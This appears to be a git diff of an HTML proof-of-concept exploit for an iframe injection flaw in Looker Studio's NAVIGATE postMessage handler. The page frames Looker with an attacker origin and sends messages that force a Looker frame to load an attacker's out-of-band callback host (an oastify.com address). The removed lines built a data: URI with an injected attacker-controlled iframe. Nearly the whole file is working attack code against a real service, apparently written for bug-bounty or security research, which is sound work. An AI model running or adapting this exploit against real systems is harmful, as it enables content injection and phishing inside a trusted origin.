@@ -1,21 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head><title>Looker Studio - Arbitrary Iframe Injection PoC</title></head>
-<body>
+<body style="margin:0;padding:20px;font-family:Arial;">
 <h2>Looker Studio - Arbitrary Iframe Injection via NAVIGATE postMessage</h2>
-<p>This PoC opens Looker Studio in a new window with <code>liu=</code> attacker origin, then injects an arbitrary iframe inside it via the <code>NAVIGATE</code> handler.</p>
+<p>Looker Studio is loaded in an iframe with <code>liu=</code> attacker origin. A second smaller iframe (also Looker) is overlaid on top — the NAVIGATE handler replaces its content with the attacker's collaborator, visually proving injection inside the Looker context.</p>
 <hr>
 
-<button id="startBtn" onclick="startExploit()" style="font-size:18px;padding:10px 30px;cursor:pointer;">Start PoC</button>
+<div id="container" style="position:relative;width:100%;height:500px;border:1px solid #333;">
+    <!-- Main Looker iframe - full size, stays untouched -->
+    <iframe id="lookerMain" style="width:100%;height:100%;border:none;"></iframe>
+
+    <!-- Injection iframe - small, overlaid on bottom-right to look "inside" Looker -->
+    <iframe id="lookerInject" style="position:absolute;bottom:15px;right:15px;width:350px;height:200px;border:2px solid #e94560;border-radius:6px;z-index:9999;background:#fff;"></iframe>
+</div>
 
 <h3>Log</h3>
-<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:400px;overflow-y:auto;font-size:13px;"></pre>
+<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:300px;overflow-y:auto;font-size:12px;"></pre>
 
 <script>
 var ATTACKER_ORIGIN = window.location.origin;
 var COLLABORATOR = 'https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com';
 var REPORT_URL = 'https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview';
-var lookerWindow = null;
 
 function logMsg(msg) {
     var pre = document.getElementById('log');
@@ -31,7 +36,6 @@ function buildUrl() {
     return u.toString();
 }
 
-// Intercept all postMessages from Looker
 window.addEventListener('message', function(e) {
     var data = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
     logMsg('RECV [' + e.origin + ']: ' + data.substring(0, 500));
@@ -41,66 +45,46 @@ window.addEventListener('message', function(e) {
     }
 });
 
-function startExploit() {
-    document.getElementById('startBtn').disabled = true;
-    document.getElementById('startBtn').textContent = 'Running...';
+var targetUrl = buildUrl();
 
-    var targetUrl = buildUrl();
-    logMsg('Opening Looker Studio in new window with liu=' + ATTACKER_ORIGIN);
+// Load main Looker iframe (stays visible, untouched)
+logMsg('Loading main Looker iframe (stays visible)...');
+document.getElementById('lookerMain').src = targetUrl;
 
-    // Open Looker in a new window (attacker is window.opener)
-    lookerWindow = window.open(targetUrl, 'looker', 'width=1200,height=800');
+// Load small overlay iframe (also Looker, will be NAVIGATEd)
+logMsg('Loading injection iframe (will be replaced via NAVIGATE)...');
+var injectFrame = document.getElementById('lookerInject');
+injectFrame.src = targetUrl;
 
-    if (!lookerWindow) {
-        logMsg('ERROR: Popup blocked. Allow popups and try again.');
-        document.getElementById('startBtn').disabled = false;
-        document.getElementById('startBtn').textContent = 'Start PoC';
-        return;
-    }
-
-    logMsg('Window opened. Waiting 6s for Angular bootstrap...');
+var injected = false;
+injectFrame.onload = function() {
+    if (injected) return;
+    injected = true;
+    logMsg('Injection iframe loaded. Waiting 5s for Angular bootstrap...');
 
     setTimeout(function() {
-        logMsg('Sending NAVIGATE to inject collaborator iframe inside Looker window...');
+        logMsg('Sending NAVIGATE to replace injection iframe with Collaborator content...');
 
-        // NAVIGATE with a data: URI that shows the Looker page content
-        // AND embeds the collaborator iframe inside it — visually proving injection
-        var injectedHtml = [
-            '<html><body style="margin:0;font-family:Arial;">',
-            '<div style="position:fixed;bottom:10px;right:10px;z-index:999999;',
-            'background:#1a1a2e;border:2px solid #e94560;border-radius:8px;',
-            'padding:12px;width:340px;box-shadow:0 4px 20px rgba(0,0,0,0.5);">',
-            '<div style="color:#e94560;font-weight:bold;font-size:13px;margin-bottom:6px;">',
-            'INJECTED IFRAME (attacker controlled)</div>',
-            '<div style="color:#aaa;font-size:11px;margin-bottom:8px;">',
-            'Loaded inside lookerstudio.google.com context</div>',
-            '<iframe src="' + COLLABORATOR + '/injected-inside-looker?proof=navigate-handler"',
-            ' width="100%" height="120" style="border:1px solid #e94560;border-radius:4px;background:#fff;"></iframe>',
-            '</div></body></html>'
-        ].join('');
-
-        lookerWindow.postMessage(JSON.stringify({
+        injectFrame.contentWindow.postMessage(JSON.stringify({
             type: 'NAVIGATE',
-            payload: { url: 'data:text/html,' + encodeURIComponent(injectedHtml) }
+            payload: { url: COLLABORATOR + '/injected-inside-looker?proof=navigate-handler' }
         }), '*');
 
-        logMsg('NAVIGATE (data: URI with embedded iframe) sent to Looker window');
+        logMsg('NAVIGATE sent. The small iframe should now show Collaborator content overlaid on Looker.');
+        logMsg('Collaborator will receive request with Referer: https://lookerstudio.google.com/');
+    }, 5000);
+};
 
-        // Fallback: also try direct URL navigate after 3s
-        setTimeout(function() {
-            logMsg('Sending direct NAVIGATE to collaborator URL...');
-            lookerWindow.postMessage(JSON.stringify({
-                type: 'NAVIGATE',
-                payload: { url: COLLABORATOR + '/injected-iframe?proof=direct-navigate' }
-            }), '*');
-            logMsg('Direct NAVIGATE sent. Check Collaborator for Referer: lookerstudio.google.com');
-
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('startBtn').textContent = 'Run Again';
-        }, 3000);
-
-    }, 6000);
-}
+setTimeout(function() {
+    if (!injected) {
+        injected = true;
+        logMsg('Timeout fallback — sending NAVIGATE anyway...');
+        injectFrame.contentWindow.postMessage(JSON.stringify({
+            type: 'NAVIGATE',
+            payload: { url: COLLABORATOR + '/injected-inside-looker?proof=timeout-fallback' }
+        }), '*');
+    }
+}, 15000);
 </script>
 </body>
 </html>
